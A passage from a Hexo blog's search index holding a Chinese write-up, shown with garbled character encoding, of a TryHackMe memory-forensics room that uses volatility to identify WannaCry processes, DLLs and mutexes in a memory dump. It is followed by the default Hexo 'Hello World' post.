2</h1><p>é¢˜ç›®å†…å®¹æ˜¯ä¸­äº†å‹’ç´¢ç—…æ¯’</p><ul><li>ç¬¬ä¸€é—®<br>æ±‚å¯ç–‘è¿›ç¨‹ï¼Œç”¨ windows.pslist å³å¯ï¼Œç„¶åå°±å¯ä»¥çœ‹è§å¤§åé¼é¼çš„@WanaDecryptor@<br>å¯ä»¥çœ‹å‡ºæ¥å’Œ wannacry æœ‰å…³ï¼Œpid ä¸º 740</li></ul><ul><li>ç¬¬ 2345 é—®<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f3961a062c95d11f65ebf.png"><br>çˆ¶è¿›ç¨‹å¯ä»¥ç”¨ windows.pstree æ±‚å‡ºæ¥<br>å®Œæ•´è·¯å¾„å¯ä»¥ç”¨ windows.dlllist</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump2.raw windows.dlllist | grep @WanaDecryptor@.exe<br></code></pre></td></tr></table></figure><blockquote><p>æ­¤å¤„ä¹Ÿå¯ä»¥ç”¨â€“pid æŒ‡å®šè¿›ç¨‹ï¼Œç„¶åå¯ä»¥çœ‹è§ç¬¬ä¸€ä¸ªå‡ºæ¥çš„å°±æ˜¯ä»–çš„å®Œæ•´è·¯å¾„<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/904ac9588136018c151ab.png"><br>è‡³äºç¬¬ 5 é—®ï¼ŒæŠŠå¯ç–‘è¿›ç¨‹åå­—æ”¾åˆ°æµè§ˆå™¨ä¸€æœå°±å¯ä»¥çœ‹è§å¤§åé¼é¼çš„ Wannacry ç—…æ¯’</p></blockquote><ul><li>ç¬¬ 6 é—®<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/654189c4a023ad21740a0.png"><br>é—® decryptor åŠ è½½äº†ä»€ä¹ˆ dll å»åˆ›å»º socketï¼Œä¹‹å‰å¯ä»¥çŸ¥é“ decryptor å°±æ˜¯ taskche.exeï¼Œpid ä¸º 1940<br>å…ˆç”¨ windows.dlllist æ±‚å‡ºæ‰€æœ‰çš„ dll</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump2.raw windows.dlllist --pid 1940 | grep .dll<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/8f04e5642bdf1d58bbbf2.png"><br>ç„¶åæŠŠæ‰€æœ‰ä¿¡æ¯å¤åˆ¶ä¸‹æ¥å»é—® gptï¼Œè®©ä»–è®²è§£è¿™é‡Œé¢çš„ dll éƒ½æ˜¯ä»€ä¹ˆåŠŸèƒ½<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/5792ece2faae0c83e681d.png"></p></blockquote><ul><li>ç¬¬ 7 é—®<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7ffdc296bcca2c1db8119.png"><br>å“ªäº›äº’æ–¥ä½“(mutex)å¯ä»¥çœ‹å‡ºæ˜¯æ¶æ„è½¯ä»¶<br>æƒ³çŸ¥é“ mutex æ˜¯ä»€ä¹ˆå¯ä»¥å»é—® gpt<br>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ° windows.handlesï¼Œè¿™ä¸ªæ’ä»¶å¯ä»¥åˆ—å‡ºä¸€ä¸ªè¿›ç¨‹çš„æ‰€æœ‰å¥æŸ„<br>é‚£ä¹ˆï¼Œå¥æŸ„ï¼ˆhandlesï¼‰åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</li></ul><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ce4809f4968ba0365d65b.png">å¯ä»¥å‚è€ƒè¿™ä¸ªï¼Œå­¦è¿‡æ“ä½œç³»ç»Ÿçš„åº”è¯¥éƒ½å¯ä»¥æ˜ç™½</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump2.raw windows.handles --pid 1940<br></code></pre></td></tr></table></figure><p>ç°åœ¨æ¥çœ‹çœ‹è¾“å‡º</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1cefe6ad7f8b049e31e29.png"><br>ç°åœ¨ä¸æ˜ç™½çš„éƒ½å¯ä»¥çœ‹åˆ°äº†ï¼Œè‡³äºå“ªä¸ªæ˜¯ç­”æ¡ˆï¼Œå¯ä»¥ä»æœç´¢å¼•æ“å¾—åˆ°ç­”æ¡ˆï¼Œæœç´¢å¼•æ“å¾ˆé‡è¦</p></blockquote><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Wannacry mutant</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·æœå³å¯</p><ul><li>æœ€åä¸€é—®ï¼Œè¿™ä¸ªæˆ‘ä¹Ÿä¸ä¼šï¼Œæ²¡ææ˜ç™½ï¼Œä¹Ÿæ˜¯é€šè¿‡çœ‹æç¤º windows.filescanï¼Œè¿™å°±æ˜¯ç­”æ¡ˆ</li></ul><h1 id="æ¨èæ–‡ç« è§†é¢‘"><a href="#æ¨èæ–‡ç« è§†é¢‘" class="headerlink" title="æ¨èæ–‡ç« è§†é¢‘"></a>æ¨èæ–‡ç« è§†é¢‘</h1><p>å¤§ç¥åšè¿™ä¸ªæˆ¿é—´çš„æ—¶å€™çš„è§†é¢‘ï¼ˆyoutubeï¼‰ï¼š<a href="https://www.youtube.com/watch?v=2DZqg2rcYTk">volatility è§†é¢‘</a><br>æœ‰å…³ Wannacry çš„æ–‡ç« ï¼Œåœ¨è¿™é‡Œé¢å¯ä»¥æ‰¾åˆ°æœ‰å…³å“ªä¸ª mutant å’Œ dll çš„è®²è§£ï¼š<a href="https://www.mandiant.com/resources/blog/wannacry-malware-profile">WannaCry Malware Profile</a></p>]]></content>
    
    
    <categories>
      
      <category>tryhackme</category>
      
      <category>å–è¯</category>
      
      <category>volatility</category>
      
    </categories>
    
    
    <tags>
      
      <tag>volatility</tag>
      
      <tag>tryhackme</tag>
      
      <tag>å–è¯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/hello-world/"/>
    <url>/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
